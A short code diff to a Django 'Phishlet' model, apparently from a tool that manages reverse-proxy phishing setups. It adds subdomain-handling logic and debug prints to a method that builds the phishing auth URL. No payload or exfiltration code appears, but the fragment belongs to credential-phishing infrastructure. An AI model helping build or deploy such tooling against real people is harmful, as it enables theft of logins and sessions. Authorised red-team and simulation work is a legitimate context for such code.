@@ -103,12 +103,27 @@ class Phishlet(models.Model):
         return self.name
     
     def get_auth_url(self) -> str:
+        
         # if in phishlet landing_host is tools.domain.com and proxy host has tools.domain.com and its proxy host is tt then auth url should be https://tt.xx.in/
         
         phishlet = self.data
         
         landing_host = phishlet.get('landing_host', '')
-        proxy_host = phishlet.get('proxy_domain', '')        
+        proxy_host = phishlet.get('proxy_domain', '')    
+        print(f"landing_host: {landing_host}, proxy_host: {proxy_host}")
+        # check if landing_host is not having subdomain
+        if '.' in landing_host:
+            parts = landing_host.split('.')
+            print(f"parts: {parts}")
+            if len(parts) > 2 :
+                print(f"landing_host is having subdomain")
+                pass
+            else:
+                print(f"landing_host is not having subdomain")
+                return f"https://{proxy_host}"
+
+
+
         if landing_host and proxy_host:
             
             # Check if there's a specific proxy_subdomain for this landing_host
